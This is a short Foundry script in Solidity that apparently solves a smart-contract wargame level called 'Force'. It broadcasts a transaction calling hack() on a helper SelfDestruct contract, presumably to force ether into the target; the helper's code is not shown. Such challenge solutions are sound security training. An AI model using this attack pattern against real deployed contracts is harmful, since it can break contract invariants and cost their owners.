// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";
import {SelfDestruct} from "../src/SelfDestruct.sol";
import {HelperConfig} from "./HelperConfig.s.sol";

contract HackForceScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        SelfDestruct selfDestruct = helperConfig.getForceConfig().selfDestruct;
        vm.startBroadcast();
        selfDestruct.hack();
        vm.stopBroadcast();
    }
}
